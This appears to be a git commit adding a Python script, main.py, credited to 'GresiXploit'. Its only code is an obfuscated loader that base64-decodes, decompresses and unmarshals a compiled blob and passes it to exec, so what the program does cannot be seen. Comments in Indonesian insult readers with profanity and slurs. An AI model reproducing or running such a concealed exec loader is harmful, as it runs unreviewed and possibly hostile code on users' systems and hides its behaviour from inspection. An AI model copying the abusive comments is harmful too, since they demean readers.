00fb5313dc8ddf1b8705bfcbd7390ee4df772f5a
DexSkieeeOfficial <mikdampratama@gmail.com>
2024-08-07 14:42:03 +0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,9 @@
+#!/usr/bin/env python3
+# Coded by DexSkieee
+# Copyright 2024 GresiXploit
+# Mau ngapain tolol, udah tolol mau recode pula
+# Anak anjeng. Fuck Script Kiddie
+# Main termux gabisa jadiin lu seorang heker tolol
+# Sipaling heker, sipaling recode
+import marshal, base64, zlib
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAE2KD05wVAYjpDCkMKYw5DFIRmjGLkZGBiSGVKYVrGyMCwmhGmaQEzAxawDIhXw3mMQBOCGZQZUllUGIrko1iB5rABMXsqK6pZqDxGhkigvijWaFaQbgirnLGcoYI5kqGcUZP5JUiR3y2m4gJNjltM+cW3mIsri29xxcdn5hbkF5XEx99iyU3MzLvF6VqRnFpQkpmfd4sx9RZLakVmCVBpSdFKhs8gE34JxcfHe/r5+Tu7+oXoOvlHArm/OGxy81NKc1LtivjBLmFgKK4FEh+YGRkZbzDwNaDAD0zMjII3WPgavDpKLrKIXGERuc4ieYlF8iKL9BUW6Qsw9OMGu8AHBkZGQQRxg4WjwaVDGAgDO8V6xBp9WnwaUOAPIABZKgiki0WALuiS1WRYyerIy7xOxJGD+SAHiAkAJPJsqQ=='))))
